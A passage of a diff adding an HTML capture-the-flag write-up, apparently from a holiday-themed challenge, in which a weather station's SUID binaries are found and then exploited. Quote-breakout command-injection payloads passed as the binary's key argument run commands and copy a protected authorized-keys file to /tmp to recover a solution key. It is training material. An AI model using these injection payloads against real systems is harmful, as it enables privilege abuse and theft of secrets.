+            String likelihoodLevel = likelihood &gt; 75 ? &quot;High&quot; : (likelihood &gt; 50 ? &quot;Medium&quot; : &quot;Low&quot;);
+
+            out.println(&quot;&lt;p&gt;Likelihood of snow: &lt;strong&gt;&quot; + likelihoodLevel + &quot;&lt;/strong&gt;&lt;/p&gt;&quot;);
+            out.println(&quot;&lt;p&gt;Temperature: &quot; + temperature + &quot; °C&lt;/p&gt;&quot;); // Explicitly cast to integer
+            out.println(&quot;&lt;p&gt;Humidity: &quot; + humidity + &quot; %&lt;/p&gt;&quot;);
+            out.println(&quot;&lt;p&gt;Pressure: &quot; + (int) pressure + &quot; hPa&lt;/p&gt;&quot;); // Explicitly cast to integer
+        } catch (Exception e) {
+            e.printStackTrace();
+            out.println(&quot;&lt;p&gt;Error: Unable to retrieve weather data. Please try again later.&lt;/p&gt;&quot;);
+        }
+    %&gt;
+&lt;/div&gt;
+&lt;script src=&quot;snowflakes.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Next, we checked whether the legacy weather binaries are running with elevated privileges. If any of them have the
+    <strong>SUID</strong> bit set, they’ll execute as their file owner (often <code>root</code>) even when launched by a
+    low-priv user — which is a classic privilege-escalation foothold.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> find / -perm -4000 -type f 2&gt;/dev/null | grep -Ei 'weather|snow|cat'
+<span class="term-red">/usr/local/weather/humidity</span>
+<span class="term-red">/usr/local/weather/pressure</span>
+<span class="term-red">/usr/local/weather/temperature</span></pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    We spotted a hard-coded key being passed into the weather binaries inside
+    <code>dashboard.jsp</code>. Before going any further, let’s validate that key by
+    invoking the binaries directly from the shell. If they return sensible readings,
+    we know the key is legitimate (and likely the “authorization key” referenced in the prompt).
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> /usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
+-2.19
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> /usr/local/weather/humidity 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
+73.00
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> /usr/local/weather/pressure 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
+1000</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Time to see if those SUID weather binaries are doing anything unsafe with user-supplied input.
+    Since we control the “key” argument, the first attempt is a classic <em>command injection</em> probe.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> /usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6; id"</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    No dice on the simple payload, so we tried a more deliberate quote-breakout with output redirection.
+    This time, we write the results to <code>/tmp/id.out</code> so we can reliably read it back.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> /usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6'; id &gt;/tmp/id.out;#"
+cat /tmp/id.out
+-2.34
+uid=6000(weather) gid=6000(weather) groups=6000(weather),2000(user)
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span></pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Since we confirmed command execution as the <code>weather</code> user, the next logical step is to
+    inspect configuration files used by the SUID binaries. Using the same quote-breakout technique,
+    we copy <code>/usr/local/weather/config</code> to a readable location in <code>/tmp</code>.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> /usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6'; cat /usr/local/weather/config &gt;/tmp/config.txt;#"
+cat /tmp/config.txt
+-2.39
+username=weather
+groupname=weather</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Next up: quick static recon on the <code>temperature</code> SUID binary. Running <code>strings</code> often
+    reveals hard-coded file paths, config expectations, logging behavior, and other clues about how the program
+    validates keys and drops privileges.
+  </p>
+
+  <p>
+    In this output, a few strings jump out immediately: references to <code>/usr/local/weather/config</code>,
+    a key file at <code>/usr/local/weather/keys/authorized_keys</code>, and multiple calls like <code>setuid</code>/<code>setgid</code>
+    (suggesting privilege changes based on config).
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> strings /usr/local/weather/temperature | head -n 80
+/lib64/ld-linux-x86-64.so.2
+__cxa_finalize
+fgets
+strcspn
+__isoc99_fscanf
+__libc_start_main
+fprintf
+fopen
+fclose
+srand
+puts
+system
+strstr
+setuid
+snprintf
+stderr
+setgid
+perror
+getpwnam
+getgrnam
+fwrite
+__stack_chk_fail
+time
+libc.so.6
+GLIBC_2.4
+GLIBC_2.2.5
+GLIBC_2.7
+GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+PTE1
+u+UH
+/usr/local/weather/config
+Failed to open config file
+username=%63s
+groupname=%63s
+Invalid config file format
+Invalid username or groupname in config file
+Failed to set effective user and group IDs
+/usr/local/weather/data/temperature
+%.2f
+temperature
+/usr/local/weather/logUsage
+%s '%s' '%s'
+<span class="term-green">/usr/local/weather/keys/authorized_keys</span>
+Failed to open authorized keys file
+Usage: %s &lt;key&gt;
+Unauthorized. A valid key must be supplied
+Error opening data file
+:*3$"
+GCC: (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0
+Scrt1.o
+__abi_tag
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+temperature.c
+__FRAME_END__
+_DYNAMIC
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_start_main@GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__isoc99_fscanf@GLIBC_2.7
+puts@GLIBC_2.2.5
+_edata
+fclose@GLIBC_2.2.5
+_fini
+__stack_chk_fail@GLIBC_2.4
+system@GLIBC_2.2.5
+snprintf@GLIBC_2.2.5
+read_temperature_sensor
+log_usage
+strcspn@GLIBC_2.2.5
+srand@GLIBC_2.2.5</pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Now that we know the temperature binary validates keys against
+    <span class="term-green">/usr/local/weather/keys/authorized_keys</span>, we can use the same command
+    injection primitive to read that file. Instead of trying to print it directly to our terminal (which can
+    get messy), we redirect it to <code>/tmp/authkeys.txt</code> and then <code>cat</code> it back out.
+  </p>
+
+  <p>
+    The output shows <strong>two authorization keys</strong>: the first is the one the station is already using
+    (we saw it hard-coded in <code>dashboard.jsp</code>), and the second is the key used by the “other system.”
+    That second value is what we need to submit to the badge.
+  </p>
+</div>
+
+<!-- Pi terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--cranpi">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> /usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6'; cat /usr/local/weather/keys/authorized_keys &gt;/tmp/authkeys.txt;#"
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> cat /tmp/authkeys.txt
+-2.44
+4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
+8ade723d-9968-45c9-9c33-7606c49c2201  <span class="term-green"><<--- Key we are looking for</span>
+<span class="term-hostline"><span class="term-user-nmap">user@weather</span><span class="term-symbol">:</span><span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> </pre>
+</div>
+
+<div class="kc-solution-header">
+  <span class="kc-solution-icon">
+    <i class="fas fa-check-circle" aria-hidden="true"></i>
+  </span>
+  <span class="kc-solution-title"><strong>SOLUTION: 8ade723d-9968-45c9-9c33-7606c49c2201</strong></span>
+</div>
+
+<!-- Solution dialogue banner -->
+<div class="kc-convo-header kc-solution-dialog-header">
+  <span class="kc-convo-icon">
+    <i class="fas fa-comment-dots" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Solution dialogue:</span>
+</div>
+
+<div class="kc-objective-detail kc-objective-detail--no-panel">
+  <div class="kc-convo-bubble">
+    <div class="kc-convo-avatar">
+      <img src="tomhessman-portrait.png"
+           alt="Thomas Bouve avatar">
+      <div class="kc-convo-name">Tom Hessman</div>
+    </div>
+
+    <div class="kc-convo-text">
+      <p>
+        Fantastic work! You've successfully exploited those vulnerabilities and retrieved the authorization key from the weather monitoring system.
+      </p>
+      <p>
+        Thanks for helping me get access back - our customers are going to have a much better experience now that we've got the weather station running again!
+      </p>
+      <div class="kc-convo-actions">
+        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
+          <i class="fas fa-play" aria-hidden="true"></i>
+          <span>Play Audio</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>       <!-- /.kc-section -->
+
+
+
+
